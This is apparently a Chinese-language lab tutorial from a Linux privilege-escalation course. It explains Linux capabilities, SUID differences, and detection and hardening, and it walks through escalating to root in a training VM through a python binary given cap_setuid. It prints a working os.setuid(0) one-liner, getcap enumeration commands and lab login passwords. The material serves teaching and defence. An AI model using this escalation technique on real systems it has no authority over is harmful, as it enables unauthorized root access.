# Day 09：Linux Capabilities — 不用成為 root，也可能擁有 root 的能力


---

## 開場

fei-student 沒有 sudo，沒有 SUID binary（L02 已 reset），PATH 也很乾淨（L03 已 reset）。

但系統裡有一個程式，它不是 SUID——`ls -la` 看起來完全正常。

可是 Linux kernel 給了它一個特殊能力：**改變自己的 UID**。

---

## 今天要解決的問題

1. Linux Capabilities 是什麼？為什麼要存在？
2. CAP_SETUID 到底允許 process 做什麼？
3. 有 Capability 的 binary 一定能提權嗎？
4. SUID 和 Capabilities 的差別在哪裡？

---

## 背景知識

### 傳統 Unix 權限模型的問題

傳統 Unix 只有兩種人：

```
root (UID 0) — 幾乎什麼都能做
非 root      — 受限於 DAC
```

這是 **all-or-nothing** 模型。

問題：如果一個程式只需要「建立 raw socket」的能力（例如 `ping`），傳統做法是整個程式以 root 執行。但 root 能做的遠不只「建立 raw socket」——這違反了最小權限原則。

### Capabilities 的解決方案

Linux 從 kernel 2.2 開始，把 root 的特權**拆成約 40+ 個獨立的小能力**。每個 capability 控制一類操作：

| Capability | 功能 |
|-----------|------|
| `CAP_NET_RAW` | 建立 raw/packet socket |
| `CAP_SETUID` | 改變 process UID |
| `CAP_SETGID` | 改變 process GID |
| `CAP_DAC_OVERRIDE` | 略過所有 read/write/execute 權限檢查 |
| `CAP_SYS_ADMIN` | 廣泛的系統管理操作（掛載、namespace 等）|
| `CAP_NET_BIND_SERVICE` | 綁定低於 1024 的 port |
| `CAP_CHOWN` | 改變檔案 owner |
| `CAP_SYS_PTRACE` | 追蹤其他 process |

現在 `ping` 不需要 SUID root 了——只需要 `cap_net_raw`：

```bash
$ getcap /usr/bin/ping
/usr/bin/ping cap_net_raw=ep
```

---

## OS 原理：Capability Sets 完整說明

每個 Process 和每個 File 都有多組 Capability sets。理解它們是掌握 Capabilities 的關鍵。

### File Capabilities（存在 binary 的 extended attribute 中）

| Set | 代號 | 意義 |
|-----|------|------|
| **Permitted (p)** | `+p` | binary 被允許使用的 capabilities |
| **Inheritable (i)** | `+i` | 可以傳遞給 exec 後的 child process |
| **Effective (e)** | `+e` | 執行時是否自動啟用 permitted capabilities |

`cap_setuid+ep` 意思：
- `+e`：effective — 執行時自動啟用（不需要程式自己呼叫 enable）
- `+p`：permitted — 被允許使用 CAP_SETUID

### Process Capabilities

| Set | 意義 |
|-----|------|
| **Effective** | 目前 kernel 用來做權限檢查的 capabilities |
| **Permitted** | process 可以使用的 capabilities（上限）|
| **Inheritable** | exec 時可以傳遞給新 binary 的 capabilities |
| **Bounding** | 限制 process 及其子 process 能取得的 capabilities |
| **Ambient** | kernel 4.3+ 新增，讓非 root 使用者的子 process 可以繼承 capabilities |

### 執行 SUID vs Capability binary 的流程

![SUID 與 Capability binary 執行流程](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day09-capabilities-diagram-01.png)



---

## 🔬 FEI Lab 環境

```
Scenario:   FEI-L05-CAPABILITIES
VM:         FEI-PRIVESC-LINUX (Ubuntu 22.04.4 LTS)
起始帳號:   fei-student (uid=1001)
目標:       root
Flag:       /root/fei-l05-flag.txt
```



### 場景準備

`ash
# 1. 以 fei-labadmin 登入
ssh fei-labadmin@192.168.77.10
# 密碼：FEI-LabAdmin-2026!

# 2. 進入場景目錄並 setup
cd /opt/fei-privesc/scenarios/FEI-L05-CAPABILITIES
sudo ./fei-setup.sh

# 3. 確認場景就緒
sudo ./fei-verify.sh
# 應看到 L05-CAPABILITIES STATUS: READY

# 4. 切換到 fei-student
su - fei-student
# 密碼：FEI-Student-2026!
`

### 部署過程

setup 做了什麼：

1. 複製 `/usr/bin/python3.10` 到 `/opt/fei-privesc/training/L05/fei-python3`
2. 設定 owner `root:root`、mode `755`（**沒有 SUID bit**）
3. 設定 capability：`cap_setuid+ep`
4. 確認原始 `/usr/bin/python3.10` 完全不受影響

verify 確認：

```
[PASS] training binary is scenario-specific copy (not symlink)
[PASS] original system binary capability unchanged
[PASS] training binary is not SUID
[PASS] intended CAP_SETUID exists
[PASS] no unintended additional capabilities
```

---

## 完整攻擊流程

### Step 1：Enumeration

```bash
fei-student@fei-privesc-linux:~$ getcap -r / 2>/dev/null
/opt/fei-privesc/training/L05/fei-python3 cap_setuid=ep    ← 異常！
/usr/bin/ping cap_net_raw=ep                                ← 正常
/usr/bin/mtr-packet cap_net_raw=ep                          ← 正常
```

`/opt/fei-privesc/training/L05/fei-python3` 有 `cap_setuid=ep`——這不是正常的系統設定。

### Step 2：檢查 binary

```bash
fei-student@fei-privesc-linux:~$ ls -la /opt/fei-privesc/training/L05/fei-python3
-rwxr-xr-x 1 root root 5904904 Sep 13 14:53 /opt/fei-privesc/training/L05/fei-python3
```

注意：**不是 SUID**（沒有 `s` bit）。`ls -la` 看起來完全「正常」。

但 `getcap` 才能看到隱藏的 capability。

### Step 3：理解 CAP_SETUID

CAP_SETUID 允許 process 呼叫 `setuid()` 系統呼叫——也就是說，process 可以把自己的 UID 改成任何值，包括 0 (root)。

Python 的 `os.setuid(0)` 正是呼叫了這個系統呼叫。

### Step 4：Attack Hypothesis

![Capabilities Attack Hypothesis](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day09-capabilities-diagram-02.png)



### Step 5：驗證

```bash
fei-student@fei-privesc-linux:~$ /opt/fei-privesc/training/L05/fei-python3 -c \
  'import os; os.setuid(0); os.system("cat /root/fei-l05-flag.txt")'
FEI{LINUX_L05_CAPABILITIES_ROOT_ACCESS}
```

### Step 6：確認 UID 變化

```bash
fei-student@fei-privesc-linux:~$ /opt/fei-privesc/training/L05/fei-python3 -c \
  'import os; os.setuid(0); os.system("id")'
uid=0(root) gid=1001(fei-student) groups=1001(fei-student)
```

注意：`uid=0(root)` 但 `gid=1001(fei-student)`。

因為 CAP_SETUID 只能改 UID，不能改 GID（那需要 CAP_SETGID）。這和 SUID（會同時改 EUID）的行為不同。

---

## Attack Path

![Capabilities Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day09-capabilities-diagram-03.png)



---

## SUID vs Capabilities 比較

| 比較 | SUID (L02) | Capabilities (L05) |
|------|-----------|-------------------|
| 設定方式 | `chmod +s` | `setcap cap_xxx+ep` |
| `ls -la` 可見？ | ✅ 看到 `s` bit | ❌ 看不出來 |
| 檢查工具 | `find -perm -4000` | `getcap` |
| 改變的是 | Effective UID → file owner | Process 的特定 capability |
| 權限範圍 | **完整 root**（all-or-nothing）| **特定能力**（最小權限）|
| GID 影響 | 如果設了 SGID 也會改 | 需要額外 CAP_SETGID |
| 設計目的 | 讓程式以 owner 身分執行 | 最小權限原則 |
| 危險程度 | root SUID = 完整 root | 取決於哪個 capability |

**關鍵差異**：SUID 是 all-or-nothing（要嘛完整 root，要嘛沒有）；Capabilities 是 granular（可以只給一小塊）。

但是：**CAP_SETUID 這個特定 capability 幾乎等同於 root**，因為它讓 process 可以直接 setuid(0)。

---

## False Positive

### 有 Capability ≠ 能提權

```bash
$ getcap /usr/bin/ping
/usr/bin/ping cap_net_raw=ep
```

`ping` 有 `cap_net_raw`——這是正常的，不是漏洞。它只能建立 raw socket，不能改 UID 或讀任意檔案。

### 哪些 Capability 真正危險？

| Capability | 危險程度 | 原因 |
|-----------|---------|------|
| `cap_setuid` | 🔴 極高 | 可以 setuid(0) → root |
| `cap_setgid` | 🔴 高 | 可以切換群組 |
| `cap_dac_override` | 🔴 極高 | 繞過所有 DAC 權限檢查 |
| `cap_dac_read_search` | 🟡 高 | 繞過讀取/搜尋權限 |
| `cap_sys_admin` | 🔴 極高 | 廣泛系統管理權限 |
| `cap_sys_ptrace` | 🟡 高 | 可以追蹤/注入其他 process |
| `cap_net_raw` | 🟢 低 | 只能建立 raw socket |
| `cap_net_bind_service` | 🟢 低 | 只能綁低 port |

### 「Capability 設計原本是 Least Privilege，為什麼錯誤配置反而危險？」

設計意圖：`cap_net_raw` 替代 ping 的 SUID → 很好，最小權限。

但如果管理員不小心給了 `cap_setuid`（相當於 root 級能力），那就像只鎖了大門但忘了鎖後門。

而且 `getcap` 比 `find -perm -4000` 更不常被檢查，所以 capability-based 的提權路徑更容易被忽略。

---

## Edge Case

### Capabilities + Interpreter = 特別危險

當 capability 被賦予 interpreter（如 python、perl、ruby）：

```
python3 + cap_setuid → 攻擊者可以寫任何 python code → os.setuid(0) → root
```

比起賦予 capability 給一個功能受限的 compiled binary，interpreter 的危險性高得多，因為攻擊者可以透過 interpreter 執行任意邏輯。

### Inherited Capabilities

如果 binary 有 `+i`（inheritable），它 exec 的子 process 可能也繼承 capability。這可以形成更複雜的攻擊鏈。

### Thread Capabilities

Capabilities 是 per-thread 的，不是 per-process 的。在多線程程式中，一個 thread 的 capability 改變不會影響其他 thread。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| `getcap -r /` 什麼都沒找到 | 範圍太大或權限不足 | 嘗試 `getcap -r /usr /opt 2>/dev/null` |
| 只看 `find -perm -4000`，沒發現異常 | SUID 搜尋看不到 capabilities | 必須用 `getcap` |
| `os.setuid(0)` 失敗 | capability 沒有正確設定 | 確認 `getcap` 顯示 `cap_setuid=ep` |
| gid 仍然是 fei-student | CAP_SETUID 只改 UID，不改 GID | 正常行為——需要 CAP_SETGID 才能改 GID |

---

## 防禦

### Detect

```bash
# 找出所有有 capability 的檔案
getcap -r / 2>/dev/null

# 特別注意危險 capabilities
getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_dac|cap_sys_admin|cap_sys_ptrace'
```

### Prevent

```bash
# 移除不必要的 capability
setcap -r /opt/fei-privesc/training/L05/fei-python3

# 避免給 interpreter 危險 capability
# 如果需要特定功能，寫一個 compiled binary 而不是用 python + cap_setuid
```

### Fix Verification

```bash
# 移除後確認
getcap /opt/fei-privesc/training/L05/fei-python3
# 應該無輸出

# 嘗試提權
/opt/fei-privesc/training/L05/fei-python3 -c 'import os; os.setuid(0)'
# 應該 PermissionError: [Errno 1] Operation not permitted
```

---

## Detection

| 監控 | 方法 |
|------|------|
| 新增 file capability | auditd：`-w /usr/sbin/setcap -p x -k capability_change` |
| 使用 setuid 系統呼叫 | auditd：`-a always,exit -F arch=b64 -S setuid -S setresuid -k setuid_calls` |
| 異常路徑的 capability binary | 定期 `getcap -r /` 比對 baseline |
| interpreter 上的 capability | 重點監控 python/perl/ruby/node |

---

## Exercise

1. 在 Lab 中用 `fei-python3` 嘗試 `os.setgid(0)`。會成功嗎？為什麼？
2. 用 `getpcaps $$` 查看目前 shell 的 process capabilities。
3. 如果把 `cap_dac_override+ep` 賦予 `cat`，fei-student 能直接 `cat /etc/shadow` 嗎？

---

## Quiz

**Q1**：一個 binary 有 `cap_setuid+ep`，`ls -la` 能看出來嗎？

### 答案

不能。`ls -la` 只顯示傳統的 rwx permission bits 和 SUID/SGID/Sticky bit。Capabilities 存在 extended attributes 中，必須用 `getcap` 才能看到。這也是 capabilities-based 提權容易被忽略的原因。



**Q2**：`/usr/bin/ping` 有 `cap_net_raw=ep`，這是漏洞嗎？

### 答案

不是。`cap_net_raw` 只允許建立 raw/packet socket（ping 需要 ICMP raw socket）。它不能改 UID、不能讀任意檔案、不能繞過 DAC。這是 capabilities 的正確使用——最小權限原則。



**Q3**：CAP_SETUID 讓 process 呼叫 `setuid(0)` 後，process 的 GID 會變成 root 嗎？

### 答案

不會。CAP_SETUID 只影響 UID（User ID），不影響 GID（Group ID）。要改 GID 需要 CAP_SETGID。在 Lab 中我們看到 `id` 輸出 `uid=0(root) gid=1001(fei-student)`——UID 變了但 GID 沒變。




## 場景收尾

做完後記得 reset，避免影響下一題：

```bash
# 以 fei-labadmin 執行
ssh fei-labadmin@192.168.77.10
cd /opt/fei-privesc/scenarios/FEI-L05-CAPABILITIES
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# 應看到 L05-CAPABILITIES STATUS: RESET
```

---

## 今天真正要記住的 3 件事

1. **`ls -la` 看不到 Capabilities**。必須用 `getcap`。這是 capabilities 容易被忽略的主要原因。
2. **Capabilities 的設計目的是 Least Privilege**。但 `cap_setuid` 這個特定 capability 幾乎等同 root。
3. **SUID 改變 EUID（自動）；Capabilities 賦予特定能力（程式需要主動使用）**。兩者機制完全不同。

---

## 給自己的問題

> 到目前為止，我們利用的都是「錯誤的設定」——sudo policy、SUID bit、PATH、cron script permission、capabilities。如果一個高權限程式的設定完全正確，但它信任了一個低權限使用者可以修改的「config 檔案」呢？

→ Day 10：Writable Trusted Resource

---

## Lab Reset

```bash
cd /opt/fei-privesc/scenarios/FEI-L05-CAPABILITIES
sudo ./fei-reset.sh
sudo ./fei-verify.sh --reset
# [PASS] training binary removed
# [PASS] capability removed
# [PASS] flag removed
# FEI-L05 STATUS: RESET
```
